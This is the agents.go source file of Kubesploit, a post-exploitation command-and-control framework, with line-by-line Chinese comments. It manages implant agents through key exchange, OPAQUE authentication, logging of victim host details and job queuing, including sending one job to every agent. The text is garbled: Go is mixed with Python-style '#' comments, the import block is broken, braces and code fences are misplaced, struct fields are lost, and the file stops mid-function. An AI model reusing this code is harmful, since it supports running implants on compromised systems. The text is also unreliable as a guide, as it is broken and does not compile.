# `kubesploit\pkg\agents\agents.go`

```
// Kubesploit 是一个基于Russel Van Tuyl的Merlin构建的后渗透命令和控制框架。
// 本文件是Kubesploit的一部分。
// 版权所有 2021 CyberArk Software Ltd.

// Kubesploit是自由软件：您可以根据GNU通用公共许可证的条款重新分发和/或修改它，
// 其中包括许可证的第3版或任何以后的版本。

// Kubesploit的分发希望能够有助于增强组织的安全性。
// Kubesploit不得以任何恶意方式使用。
// Kubesploit按原样分发，没有任何担保；包括适销性或特定用途的隐含担保。请参阅
// GNU通用公共许可证以获取更多详细信息。

// 您应该已经收到了GNU通用公共许可证的副本
// 与Kubesploit一起。如果没有，请参见<http://www.gnu.org/licenses/>。

// 代理包
package agents
# 导入标准库
import (
	"bytes"  # 导入 bytes 库，用于操作字节流
	"crypto/rand"  # 导入 crypto/rand 库，用于生成随机数
	"crypto/rsa"  # 导入 crypto/rsa 库，用于 RSA 加密算法
	"crypto/sha256"  # 导入 crypto/sha256 库，用于 SHA-256 哈希算法
	"encoding/base64"  # 导入 encoding/base64 库，用于 base64 编码
	"errors"  # 导入 errors 库，用于处理错误
	"fmt"  # 导入 fmt 库，用于格式化输出
	"io"  # 导入 io 库，用于 I/O 操作
	"io/ioutil"  # 导入 ioutil 库，用于读取文件内容
	"os"  # 导入 os 库，用于操作系统相关功能
	"path"  # 导入 path 库，用于处理文件路径
	"path/filepath"  # 导入 filepath 库，用于处理文件路径
	"strconv"  # 导入 strconv 库，用于字符串和基本数据类型之间的转换
	"strings"  # 导入 strings 库，用于字符串操作
	"time"  # 导入 time 库，用于时间操作

	// 第三方库
	"github.com/cretz/gopaque/gopaque"  # 导入第三方库 github.com/cretz/gopaque/gopaque
)
// 导入第三方库，用于控制台输出颜色
"github.com/fatih/color"
// 导入第三方库，用于在控制台中绘制表格
"github.com/olekukonko/tablewriter"
// 导入第三方库，用于生成唯一标识符
"github.com/satori/go.uuid"
// 导入第三方库，用于密码学相关操作
"go.dedis.ch/kyber/v3"

// Merlin
// 导入自定义包，用于处理消息的 API
messageAPI "kubesploit/pkg/api/messages"
// 导入自定义包，用于核心功能
"kubesploit/pkg/core"
// 导入自定义包，用于日志记录
"kubesploit/pkg/logging"
// 导入自定义包，用于处理消息
"kubesploit/pkg/messages"
)

// 全局变量

// Agents 包含所有已实例化的代理对象，可以被其他模块访问
var Agents = make(map[uuid.UUID]*agent)

type agent struct {
    // ID 代理的唯一标识符
    ID               uuid.UUID
    // Platform 代理所在的平台
    Platform         string
	Architecture     string  // 存储计算机架构信息的字符串
	UserName         string  // 存储用户名的字符串
	UserGUID         string  // 存储用户GUID的字符串
	HostName         string  // 存储主机名的字符串
	Ips              []string  // 存储IP地址的字符串数组
	Pid              int  // 存储进程ID的整数
	agentLog         *os.File  // 存储代理日志文件的指针
	channel          chan []Job  // 存储作业通道的通道
	InitialCheckIn   time.Time  // 存储初始检查时间的时间对象
	StatusCheckIn    time.Time  // 存储状态检查时间的时间对象
	Version          string  // 存储版本信息的字符串
	Build            string  // 存储构建信息的字符串
	WaitTime         string  // 存储等待时间的字符串
	PaddingMax       int  // 存储填充最大值的整数
	MaxRetry         int  // 存储最大重试次数的整数
	FailedCheckin    int  // 存储失败检查次数的整数
	Skew             int64  // 存储偏移量的64位整数
	Proto            string  // 存储协议信息的字符串
	KillDate         int64  // 存储终止日期的64位整数
	RSAKeys          *rsa.PrivateKey  // 存储RSA私钥的指针，用于解密消息
// PublicKey is a variable of type rsa.PublicKey used to store the public key for encrypting messages
// secret is a variable of type []byte used for performing symmetric encryption operations
// OPAQUEServerAuth is a variable of type gopaque.ServerAuth used to store OPAQUE Server Authentication information
// OPAQUEServerReg is a variable of type gopaque.ServerRegister used to store OPAQUE server registration information
// OPAQUERecord is a variable of type gopaque.ServerRegisterComplete used to hold OPAQUE kU, EnvU, PrivS, PubU
// JA3 is a variable of type string used to store the JA3 signature applied to the agent's TLS client

// KeyExchange is a function used to exchange public keys between the server and agent
func KeyExchange(m messages.Base) (messages.Base, error) {
    // Check if debug mode is enabled and print a debug message
    if core.Debug {
        message("debug", "Entering into agents.KeyExchange function")
    }

    // Create a serverKeyMessage object of type messages.Base with specified properties
    serverKeyMessage := messages.Base{
        ID:      m.ID,
        Version: 1.0,
        Type:    "KeyExchange",
        Padding: core.RandStringBytesMaskImprSrc(4096), // Generate random padding string
    }
// 确保代理已经进行了身份验证
if !isAgent(m.ID) {
    return serverKeyMessage, fmt.Errorf("the agent does not exist")
}

// 记录日志，表示接收到来自特定代理的新的密钥交换
logging.Server(fmt.Sprintf("Received new agent key exchange from %s", m.ID))

// 将消息载荷转换为密钥交换消息
ke := m.Payload.(messages.KeyExchange)

// 如果处于调试模式，记录接收到的新公钥
if core.Debug {
    message("debug", fmt.Sprintf("Received new public key from %s:\r\n%v", m.ID, ke.PublicKey))
}

// 设置服务器密钥消息的ID为代理的ID
serverKeyMessage.ID = Agents[m.ID].ID
// 更新代理的公钥
Agents[m.ID].PublicKey = ke.PublicKey

// 生成密钥对
privateKey, rsaErr := rsa.GenerateKey(rand.Reader, 4096)
// 如果生成密钥对时出现错误
if rsaErr != nil {
		// 返回包含服务器密钥消息和错误信息的元组
		return serverKeyMessage, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", rsaErr.Error())
	}

	// 将生成的私钥存储到 Agents 列表中
	Agents[m.ID].RSAKeys = privateKey

	// 如果处于调试模式，打印服务器的公钥
	if core.Debug {
		message("debug", fmt.Sprintf("Server's Public Key: %v", Agents[m.ID].RSAKeys.PublicKey))
	}

	// 创建密钥交换消息
	pk := messages.KeyExchange{
		PublicKey: Agents[m.ID].RSAKeys.PublicKey,
	}

	// 设置服务器密钥消息的 ID 和 Payload
	serverKeyMessage.ID = m.ID
	serverKeyMessage.Payload = pk

	// 如果处于调试模式，打印调试信息
	if core.Debug {
		message("debug", "Leaving agents.KeyExchange returning without error")
		message("debug", fmt.Sprintf("serverKeyMessage: %v", serverKeyMessage))
	}
```

// 返回服务器密钥消息和空错误
return serverKeyMessage, nil
}

// OPAQUERegistrationInit用于注册利用OPAQUE密码认证密钥交换（PAKE）协议的代理
func OPAQUERegistrationInit(m messages.Base, opaqueServerKey kyber.Scalar) (messages.Base, error) {
	// 如果调试模式开启，打印进入agents.OPAQUERegistrationInit函数的调试信息
	if core.Debug {
		message("debug", "Entering into agents.OPAQUERegistrationInit function")
	}

	// 创建返回消息对象
	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "RegInit",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// 检查代理是否已经在服务器端注册
	if isAgent(m.ID) {
		// 如果代理已经注册，则返回错误信息
		return returnMessage, fmt.Errorf("the %s agent has already been registered", m.ID.String())
	}
// 创建一个新的服务器注册对象，使用默认加密算法和服务器密钥
serverReg := gopaque.NewServerRegister(gopaque.CryptoDefault, opaqueServerKey)

// 创建一个用户注册初始化对象
var userRegInit gopaque.UserRegisterInit

// 将收到的字节流转换为用户注册初始化对象
errUserRegInit := userRegInit.FromBytes(gopaque.CryptoDefault, m.Payload.([]byte))
if errUserRegInit != nil {
    return returnMessage, fmt.Errorf("there was an error unmarshalling the OPAQUE user register initialization message from bytes:\r\n%s", errUserRegInit.Error())
}

// 检查用户注册初始化消息中的用户ID是否与Merlin消息中的ID相匹配
if !bytes.Equal(userRegInit.UserID, m.ID.Bytes()) {
    // 如果启用了详细模式，则打印用户ID和消息ID
    if core.Verbose {
        message("note", fmt.Sprintf("OPAQUE UserID: %v", userRegInit.UserID))
        message("note", fmt.Sprintf("Merlin Message UserID: %v", m.ID.Bytes()))
    }
    return returnMessage, errors.New("the OPAQUE UserID doesn't match the Merlin message ID")
}

// 使用用户注册初始化对象初始化服务器注册对象
serverRegInit := serverReg.Init(&userRegInit)

// 将服务器注册初始化对象转换为字节流
serverRegInitBytes, errServerRegInitBytes := serverRegInit.ToBytes()
// 如果 errServerRegInitBytes 不为空，返回错误消息和错误信息
if errServerRegInitBytes != nil {
    return returnMessage, fmt.Errorf("there was an error marshalling the OPAQUE server registration initialization message to bytes:\r\n%s", errServerRegInitBytes.Error())
}

// 将 serverRegInitBytes 赋值给 returnMessage 的 Payload 属性
returnMessage.Payload = serverRegInitBytes

// 创建新的 agent 并将其添加到全局映射中
agent, agentErr := newAgent(m.ID)
if agentErr != nil {
    return returnMessage, fmt.Errorf("there was an error creating a new agent instance for %s:\r\n%s", m.ID.String(), agentErr.Error())
}
agent.OPAQUEServerReg = *serverReg

// 将 agent 添加到全局映射中
Agents[m.ID] = &agent

// 记录日志，表示接收到 agent 的 OPAQUE 注册初始化消息
Log(m.ID, "Received agent OPAQUE register initialization message")

// 如果处于调试模式，输出调试信息
if core.Debug {
    message("debug", "Leaving agents.OPAQUERegistrationInit function without error")
}
	}

	return returnMessage, nil
}

// OPAQUERegistrationComplete is used to complete OPAQUE user registration and store the encrypted envelope EnvU
func OPAQUERegistrationComplete(m messages.Base) (messages.Base, error) {
	// 如果调试模式开启，打印进入函数的调试信息
	if core.Debug {
		message("debug", "Entering into agents.OPAQUERegistrationComplete function")
	}

	// 创建返回消息对象
	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "RegComplete",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// 检查该代理是否已知于服务器
	if !isAgent(m.ID) {
		// 返回错误消息和格式化的错误，指示代理尚未完成 OPAQUE 用户注册初始化
		return returnMessage, fmt.Errorf("the %s agent has not completed OPAQUE user registration intialization", m.ID.String())
	}

	// 创建一个空的 OPAQUE 用户注册完成结构体
	var userRegComplete gopaque.UserRegisterComplete

	// 从字节流中解析 OPAQUE 用户注册完成消息
	errUserRegComplete := userRegComplete.FromBytes(gopaque.CryptoDefault, m.Payload.([]byte))
	// 如果解析出错，返回错误消息
	if errUserRegComplete != nil {
		return returnMessage, fmt.Errorf("there was an error unmarshalling the OPAQUE user register complete message from bytes:\r\n%s", errUserRegComplete.Error())
	}

	// 将 OPAQUE 用户注册完成消息传递给 OPAQUE 服务器注册对象的 Complete 方法，并将结果存储在代理的 OPAQUERecord 中
	Agents[m.ID].OPAQUERecord = *Agents[m.ID].OPAQUEServerReg.Complete(&userRegComplete)

	// 检查 Merlin 用户ID 是否与 OPAQUE 用户ID 匹配
	if !bytes.Equal(m.ID.Bytes(), Agents[m.ID].OPAQUERecord.UserID) {
		// 如果不匹配，返回错误消息
		return returnMessage, fmt.Errorf("the OPAQUE UserID: %v doesn't match the Merlin UserID: %v", Agents[m.ID].OPAQUERecord.UserID, m.ID.Bytes())
	}

	// 记录 OPAQUE 注册完成的日志
	Log(m.ID, "OPAQUE registration complete")

	// 如果处于调试模式
	if core.Debug {
		message("debug", "Leaving agents.OPAQUERegistrationComplete function without error")
	}
    // 返回消息和空错误

	return returnMessage, nil
}

// OPAQUEAuthenticateInit is used to authenticate an agent leveraging the OPAQUE Password Authenticated Key Exchange (PAKE) protocol and pre-shared key
// OPAQUEAuthenticateInit 用于使用 OPAQUE 密码认证密钥交换（PAKE）协议和预共享密钥对代理进行身份验证
func OPAQUEAuthenticateInit(m messages.Base) (messages.Base, error) {
    // 如果调试模式开启，则输出进入函数的调试信息
	if core.Debug {
		message("debug", "Entering into agents.OPAQUEAuthenticateInit function")
	}

    // 创建返回消息对象
	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "AuthInit",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// 检查服务器是否已知该代理
// 如果不是代理用户，返回重新注册消息
if !isAgent(m.ID) {
    returnMessage.Type = "ReRegister"
    return returnMessage, nil
}

// 1 - 接收用户的 UserAuthInit
// 创建服务器端密钥交换对象
serverKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
// 创建服务器端认证对象
serverAuth := gopaque.NewServerAuth(gopaque.CryptoDefault, serverKex)
// 将服务器端认证对象存储到代理用户的数据结构中
Agents[m.ID].OPAQUEServerAuth = *serverAuth

// 创建用户认证初始化对象
var userInit gopaque.UserAuthInit
// 从字节流中解析用户认证初始化消息
errFromBytes := userInit.FromBytes(gopaque.CryptoDefault, m.Payload.([]byte))
if errFromBytes != nil {
    // 如果解析出错，记录警告信息
    message("warn", fmt.Sprintf("there was an error unmarshalling the user init message from bytes:\r\n%s", errFromBytes.Error()))
}

// 完成服务器端认证
serverAuthComplete, errServerAuthComplete := serverAuth.Complete(&userInit, &Agents[m.ID].OPAQUERecord)

// 如果完成服务器端认证出错，返回错误信息
if errServerAuthComplete != nil {
    return returnMessage, fmt.Errorf("there was an error completing the OPAQUE server authentication:\r\n%s", errServerAuthComplete.Error())
}
	}

	// 如果调试模式开启，打印用户认证初始化和服务器认证完成的信息
	if core.Debug {
		message("debug", fmt.Sprintf("User Auth Init:\r\n%+v", userInit))
		message("debug", fmt.Sprintf("Server Auth Complete:\r\n%+v", serverAuthComplete))
	}

	// 将服务器认证完成的消息转换为字节流
	serverAuthCompleteBytes, errServerAuthCompleteBytes := serverAuthComplete.ToBytes()
	// 如果转换过程中出现错误，返回错误信息
	if errServerAuthCompleteBytes != nil {
		return returnMessage, fmt.Errorf("there was an error marshalling the OPAQUE server authentication complete message to bytes:\r\n%s", errServerAuthCompleteBytes.Error())
	}

	// 将服务器认证完成的字节流作为返回消息的载荷
	returnMessage.Payload = serverAuthCompleteBytes
	// 将共享密钥存储在代理的secret属性中
	Agents[m.ID].secret = []byte(serverKex.SharedSecret.String())

	// 记录接收到新的代理 OPAQUE 认证初始化消息
	Log(m.ID, "Received new agent OPAQUE authentication initialization message")

	// 如果调试模式开启，打印接收到新的代理 OPAQUE 认证的信息
	if core.Debug {
		message("debug", fmt.Sprintf("Received new agent OPAQUE authentication for %s at %s", m.ID, time.Now().UTC().Format(time.RFC3339)))
		message("debug", "Leaving agents.OPAQUEAuthenticateInit function without error")
	// 调用 message 函数输出调试信息，显示服务器 OPAQUE 密钥交换的共享密钥
	message("debug", fmt.Sprintf("Server OPAQUE key exchange shared secret: %v", Agents[m.ID].secret))
	}

	// 返回消息和错误
	return returnMessage, nil
}

// OPAQUEAuthenticateComplete 用于接收 OPAQUE UserAuthComplete
func OPAQUEAuthenticateComplete(m messages.Base) (messages.Base, error) {
	// 如果处于调试模式，输出进入 agents.OPAQUEAuthenticateComplete 函数的调试信息
	if core.Debug {
		message("debug", "Entering into agents.OPAQUEAuthenticateComplete function")
	}

	// 创建返回消息对象
	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
		Type:    "ServerOk",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// 检查该代理是否已知于服务器
	if !isAgent(m.ID) {
		// 返回错误消息和格式化的错误信息，说明该代理不被识别
		return returnMessage, fmt.Errorf("%s is not a known agent", m.ID.String())
	}

	// 记录日志，说明接收到了代理OPAQUE认证完成的消息
	Log(m.ID, "Received agent OPAQUE authentication complete message")

	// 将消息载荷转换为用户认证完成结构体
	var userComplete gopaque.UserAuthComplete
	errFromBytes := userComplete.FromBytes(gopaque.CryptoDefault, m.Payload.([]byte))
	if errFromBytes != nil {
		// 记录警告日志，说明从字节中解析用户完成消息时出现错误
		message("warn", fmt.Sprintf("there was an error unmarshalling the user complete message from bytes:\r\n%s", errFromBytes.Error()))
	}

	// 服务器认证完成
	errAuthFinish := Agents[m.ID].OPAQUEServerAuth.Finish(&userComplete)
	if errAuthFinish != nil {
		// 记录警告日志，说明在完成认证时出现错误
		message("warn", fmt.Sprintf("there was an error finishing authentication:\r\n%s", errAuthFinish.Error()))
	}

	// 如果处于调试模式，记录调试日志，说明在没有错误的情况下离开了agents.OPAQUEAuthenticateComplete函数
	if core.Debug {
		message("debug", "Leaving agents.OPAQUEAuthenticateComplete function without error")
	}
	return returnMessage, nil
}

// OPAQUEReAuthenticate is used when an agent has previously completed OPAQUE registration but needs to re-authenticate
func OPAQUEReAuthenticate(agentID uuid.UUID) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into agents.OPAQUEReAuthenticate function")
	}

	returnMessage := messages.Base{
		ID:      agentID,
		Version: 1.0,
		Type:    "ReAuthenticate",
		Padding: core.RandStringBytesMaskImprSrc(4096),
	}

	// Check to see if this agent is already known to the server
	if !isAgent(agentID) {
		// 如果代理已经在服务器上注册，则返回错误信息
		return returnMessage, fmt.Errorf("the %s agent has not OPAQUE registered", agentID.String())
	}

	// 如果调试模式开启，打印调试信息
	if core.Debug {
		message("debug", "Leaving agents.OPAQUEReAuthenticate function without error")
	}
	// 记录日志，指示代理重新使用 OPAQUE 协议进行身份验证
	Log(agentID, "Instructing agent to re-authenticate with OPAQUE protocol")

	// 返回消息和空错误
	return returnMessage, nil
}

// GetEncryptionKey 检索用于解密任何协议消息的每个代理有效载荷加密密钥
func GetEncryptionKey(agentID uuid.UUID) []byte {
	// 如果调试模式开启，打印调试信息
	if core.Debug {
		message("debug", "Entering into agents.GetEncryptionKey function")
	}
	var key []byte

	// 如果代理存在，获取其密钥
	if isAgent(agentID) {
		key = Agents[agentID].secret
	}
```

// 如果调试模式开启，打印调试信息
if core.Debug {
    message("debug", "Leaving agents.GetEncryptionKey function")
}
// 返回加密密钥
return key
}

// StatusCheckIn 是当代理发送消息回服务器时运行的函数，用于检查是否有额外指令
func StatusCheckIn(m messages.Base) (messages.Base, error) {
    // 检查代理 UUID 是否在数据集中
    _, ok := Agents[m.ID]
    if !ok {
        // 如果代理 UUID 不在数据集中，打印警告信息，并记录日志
        message("warn", fmt.Sprintf("Orphaned agent %s has checked in at %s. Instructing agent to re-initialize...",
            time.Now().UTC().Format(time.RFC3339), m.ID.String()))
        logging.Server(fmt.Sprintf("[Orphaned agent %s has checked in", m.ID.String()))
        // 创建一个初始化作业，并设置相关属性
        job := Job{
            ID:      core.RandStringBytesMaskImprSrc(10),
            Type:    "initialize",
            Created: time.Now(),
            Status:  "created",
```
		}
		// 通过调用 GetMessageForJob 函数获取与作业相关的消息
		m, mErr := GetMessageForJob(m.ID, job)
		// 返回消息和可能的错误
		return m, mErr
	}

	// 记录代理状态检查
	Log(m.ID, "Agent status check in")
	// 如果设置了详细输出，则输出成功消息
	if core.Verbose {
		message("success", fmt.Sprintf("Received agent status checkin from %s", m.ID))
	}
	// 如果设置了调试模式，则输出调试消息
	if core.Debug {
		message("debug", fmt.Sprintf("Received agent status checkin from %s", m.ID))
		message("debug", fmt.Sprintf("Channel length: %d", len(Agents[m.ID].channel)))
		message("debug", fmt.Sprintf("Channel content: %v", Agents[m.ID].channel))
	}

	// 更新代理的状态检查时间
	Agents[m.ID].StatusCheckIn = time.Now().UTC()
	// 检查是否有任何作业
	if len(Agents[m.ID].channel) >= 1 {
		// 从代理的通道中获取作业
		job := <-Agents[m.ID].channel
		// 如果设置了调试模式
		if core.Debug {
// 使用消息函数输出调试信息，格式化输出通道命令字符串
message("debug", fmt.Sprintf("Channel command string: %s", job))
// 使用消息函数输出调试信息，格式化输出代理命令类型
message("debug", fmt.Sprintf("Agent command type: %s", job[0].Type))

// 获取指定作业的消息，返回消息和错误
m, mErr := GetMessageForJob(m.ID, job[0])
return m, mErr
}

// 创建返回消息对象，设置版本、ID、类型和填充字段
returnMessage := messages.Base{
    Version: 1.0,
    ID:      m.ID,
    Type:    "ServerOk",
    Padding: core.RandStringBytesMaskImprSrc(Agents[m.ID].PaddingMax),
}
// 返回消息对象和空错误
return returnMessage, nil
}

// UpdateInfo 用于使用传入的消息数据更新代理信息
func UpdateInfo(m messages.Base) error {
// 如果调试模式开启，使用消息函数输出调试信息
if core.Debug {
    message("debug", "Entering into agents.UpdateInfo function")
```

	}

	// 将消息的载荷转换为AgentInfo类型
	p := m.Payload.(messages.AgentInfo)

	// 如果消息中的代理ID不在已知代理列表中，则发出警告并返回错误
	if !isAgent(m.ID) {
		message("warn", "The agent was not found while processing an AgentInfo message")
		return fmt.Errorf("%s is not a known agent", m.ID)
	}

	// 如果调试模式开启，则输出代理信息的调试日志
	if core.Debug {
		message("debug", "Processing new agent info")
		message("debug", fmt.Sprintf("Agent Version: %s", p.Version))
		message("debug", fmt.Sprintf("Agent Build: %s", p.Build))
		message("debug", fmt.Sprintf("Agent waitTime: %s", p.WaitTime))
		message("debug", fmt.Sprintf("Agent skew: %d", p.Skew))
		message("debug", fmt.Sprintf("Agent paddingMax: %d", p.PaddingMax))
		message("debug", fmt.Sprintf("Agent maxRetry: %d", p.MaxRetry))
		message("debug", fmt.Sprintf("Agent failedCheckin: %d", p.FailedCheckin))
		message("debug", fmt.Sprintf("Agent proto: %s", p.Proto))
		message("debug", fmt.Sprintf("Agent killdate: %s", time.Unix(p.KillDate, 0).UTC().Format(time.RFC3339)))
		message("debug", fmt.Sprintf("Agent JA3 signature: %s", p.JA3))
	}
	// 记录代理信息消息的处理过程
	Log(m.ID, "Processing AgentInfo message:")
	// 记录代理版本信息
	Log(m.ID, fmt.Sprintf("\tAgent Version: %s ", p.Version))
	// 记录代理构建信息
	Log(m.ID, fmt.Sprintf("\tAgent Build: %s ", p.Build))
	// 记录代理等待时间
	Log(m.ID, fmt.Sprintf("\tAgent waitTime: %s ", p.WaitTime))
	// 记录代理时间偏差
	Log(m.ID, fmt.Sprintf("\tAgent skew: %d ", p.Skew))
	// 记录代理最大填充
	Log(m.ID, fmt.Sprintf("\tAgent paddingMax: %d ", p.PaddingMax))
	// 记录代理最大重试次数
	Log(m.ID, fmt.Sprintf("\tAgent maxRetry: %d ", p.MaxRetry))
	// 记录代理失败签入次数
	Log(m.ID, fmt.Sprintf("\tAgent failedCheckin: %d ", p.FailedCheckin))
	// 记录代理协议
	Log(m.ID, fmt.Sprintf("\tAgent proto: %s ", p.Proto))
	// 记录代理终止日期
	Log(m.ID, fmt.Sprintf("\tAgent KillDate: %s", time.Unix(p.KillDate, 0).UTC().Format(time.RFC3339)))
	// 记录代理JA3签名
	Log(m.ID, fmt.Sprintf("\tAgent JA3 signature: %s", p.JA3))

	// 更新代理信息到全局代理列表中
	Agents[m.ID].Version = p.Version
	Agents[m.ID].Build = p.Build
	Agents[m.ID].WaitTime = p.WaitTime
	Agents[m.ID].Skew = p.Skew
	Agents[m.ID].PaddingMax = p.PaddingMax
	Agents[m.ID].MaxRetry = p.MaxRetry
	Agents[m.ID].FailedCheckin = p.FailedCheckin
# 将 m.ID 对应的代理的协议设置为 p.Proto
Agents[m.ID].Proto = p.Proto
# 将 m.ID 对应的代理的终止日期设置为 p.KillDate
Agents[m.ID].KillDate = p.KillDate
# 将 m.ID 对应的代理的JA3设置为 p.JA3
Agents[m.ID].JA3 = p.JA3

# 将 m.ID 对应的代理的架构设置为 p.SysInfo.Architecture
Agents[m.ID].Architecture = p.SysInfo.Architecture
# 将 m.ID 对应的代理的主机名设置为 p.SysInfo.HostName
Agents[m.ID].HostName = p.SysInfo.HostName
# 将 m.ID 对应的代理的进程ID设置为 p.SysInfo.Pid
Agents[m.ID].Pid = p.SysInfo.Pid
# 将 m.ID 对应的代理的IP地址设置为 p.SysInfo.Ips
Agents[m.ID].Ips = p.SysInfo.Ips
# 将 m.ID 对应的代理的平台设置为 p.SysInfo.Platform
Agents[m.ID].Platform = p.SysInfo.Platform
# 将 m.ID 对应的代理的用户名设置为 p.SysInfo.UserName
Agents[m.ID].UserName = p.SysInfo.UserName
# 将 m.ID 对应的代理的用户GUID设置为 p.SysInfo.UserGUID
Agents[m.ID].UserGUID = p.SysInfo.UserGUID

# 如果处于调试模式，则记录调试信息到日志文件
if core.Debug {
    message("debug", "Leaving agents.UpdateInfo function")
}
# 返回空值
return nil
}

# Log 用于将日志消息写入代理的日志文件
func Log(agentID uuid.UUID, logMessage string) {
// 如果调试模式开启，打印进入 agents.Log 的调试信息
if core.Debug {
    message("debug", "Entering into agents.Log")
}
// 向指定 agent 的日志文件中写入日志信息
_, err := Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]%s\r\n", time.Now().UTC().Format(time.RFC3339), logMessage))
// 如果写入出现错误，打印错误信息
if err != nil {
    message("warn", fmt.Sprintf("There was an error writing to the agent log agents.Log:\r\n%s", err.Error()))
}

// GetAgentList 返回存在的代理列表，用于命令行的自动补全
func GetAgentList() func(string) []string {
    return func(line string) []string {
        a := make([]string, 0)
        // 遍历代理列表，将代理的字符串形式添加到列表中
        for k := range Agents {
            a = append(a, k.String())
        }
        return a
    }
}
// ShowInfo函数用于在表格中列出代理的所有结构值
func ShowInfo(agentID uuid.UUID) {
    // 检查代理ID是否有效
    if !isAgent(agentID) {
        // 如果代理ID无效，则输出警告信息并返回
        message("warn", fmt.Sprintf("%s is not a valid agent!", agentID))
        return
    }

    // 创建一个新的表格写入器
    table := tablewriter.NewWriter(os.Stdout)
    table.SetAlignment(tablewriter.ALIGN_LEFT)

    // 创建包含代理信息的二维字符串数组
    data := [][]string{
        {"Status", GetAgentStatus(agentID)},
        {"ID", Agents[agentID].ID.String()},
        {"Platform", Agents[agentID].Platform},
        {"Architecture", Agents[agentID].Architecture},
        {"UserName", Agents[agentID].UserName},
        {"User GUID", Agents[agentID].UserGUID},
        {"Hostname", Agents[agentID].HostName},
        {"Process ID", strconv.Itoa(Agents[agentID].Pid)},
    }
		{"IP", fmt.Sprintf("%v", Agents[agentID].Ips)}, // 将代理的IP地址添加到数据中
		{"Initial Check In", Agents[agentID].InitialCheckIn.Format(time.RFC3339)}, // 将代理的初始检查时间添加到数据中
		{"Last Check In", Agents[agentID].StatusCheckIn.Format(time.RFC3339)}, // 将代理的最后一次检查时间添加到数据中
		{"Agent Version", Agents[agentID].Version}, // 将代理的版本号添加到数据中
		{"Agent Build", Agents[agentID].Build}, // 将代理的构建版本添加到数据中
		{"Agent Wait Time", Agents[agentID].WaitTime}, // 将代理的等待时间添加到数据中
		{"Agent Wait Time Skew", strconv.FormatInt(Agents[agentID].Skew, 10)}, // 将代理的等待时间偏差添加到数据中
		{"Agent Message Padding Max", strconv.Itoa(Agents[agentID].PaddingMax)}, // 将代理的消息填充最大值添加到数据中
		{"Agent Max Retries", strconv.Itoa(Agents[agentID].MaxRetry)}, // 将代理的最大重试次数添加到数据中
		{"Agent Failed Check In", strconv.Itoa(Agents[agentID].FailedCheckin)}, // 将代理的失败检查次数添加到数据中
		{"Agent Kill Date", time.Unix(Agents[agentID].KillDate, 0).UTC().Format(time.RFC3339)}, // 将代理的终止日期添加到数据中
		{"Agent Communication Protocol", Agents[agentID].Proto}, // 将代理的通信协议添加到数据中
		{"Agent JA3 TLS Client Signature", Agents[agentID].JA3}, // 将代理的JA3 TLS客户端签名添加到数据中
	}
	table.AppendBulk(data) // 将数据批量添加到表格中
	fmt.Println() // 打印空行
	table.Render() // 渲染表格
	fmt.Println() // 打印空行
}
// message 函数用于向所有连接的客户端发送广播消息
func message(level string, message string) {
    // 创建一个 UserMessage 结构体对象，包含消息内容、时间和错误信息
    m := messageAPI.UserMessage{
        Message: message,
        Time:    time.Now().UTC(),
        Error:   false,
    }
    // 根据不同的消息级别设置 UserMessage 结构体对象的 Level 属性
    switch level {
    case "info":
        m.Level = messageAPI.Info
    case "note":
        m.Level = messageAPI.Note
    case "warn":
        m.Level = messageAPI.Warn
    case "debug":
        m.Level = messageAPI.Debug
    case "success":
        m.Level = messageAPI.Success
    case "plain":
        m.Level = messageAPI.Plain
    // 如果 level 不匹配任何已知级别，则不设置 Level 属性
// 根据不同的情况设置消息的级别为普通消息
default:
    m.Level = messageAPI.Plain
}
// 发送广播消息
messageAPI.SendBroadcastMessage(m)
}

// AddJob 创建一个作业并将其添加到指定代理的通道中，并返回作业ID或错误
func AddJob(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
    // TODO 将此转换为代理结构的方法
    if core.Debug {
        message("debug", fmt.Sprintf("In agents.AddJob function for agent: %s", agentID.String()))
        message("debug", fmt.Sprintf("In agents.AddJob function for type: %s", jobType))
        message("debug", fmt.Sprintf("In agents.AddJob function for command: %s", jobArgs))
    }

    // 如果代理存在或者代理ID为默认值，则创建作业
    if isAgent(agentID) || agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
        job := Job{
            Type:    jobType,
            Status:  "created",
            Args:    jobArgs,
# 创建一个包含当前时间的结构体
Created: time.Now().UTC(),
}

# 如果代理ID为全f字符串，则执行以下操作
if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
    # 如果代理数量小于等于0，则返回错误
    if len(Agents) <= 0 {
        return "", errors.New("there are 0 available agents, no jobs were created")
    }
    # 遍历代理列表，将作业分配给每个代理
    for k := range Agents {
        s := Agents[k].channel
        # 为作业生成一个随机ID
        job.ID = core.RandStringBytesMaskImprSrc(10)
        # 将作业发送到代理的通道中
        s <- []Job{job}
        # 记录日志
        Log(k, fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Args:%s",
            job.Type,
            job.ID,
            job.Status,
            job.Args))
    }
    # 返回作业ID和空错误
    return job.ID, nil
}
# 为作业生成一个随机ID
job.ID = core.RandStringBytesMaskImprSrc(10)
		// 从Agents映射中获取指定agentID对应的通道
		s := Agents[agentID].channel
		// 将job添加到通道中
		s <- []Job{job}
		// 记录日志，包括job的类型、ID、状态和参数
		Log(agentID, fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Args:%s",
			job.Type,
			job.ID,
			job.Status,
			job.Args))
		// 返回job的ID和nil错误
		return job.ID, nil
	}
	// 如果agentID无效，则返回空字符串和错误信息
	return "", errors.New("invalid agent ID")
}

// GetMessageForJob根据作业类型返回一个消息基本结构
func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
	// 创建一个消息基本结构
	m := messages.Base{
		Version: 1.0,
		ID:      agentID,
	}
	// 如果agentID无效，则返回错误信息
	if !isAgent(agentID) {
		return m, fmt.Errorf("%s is not a valid agent", agentID.String())
	}
	// 生成随机填充字符串
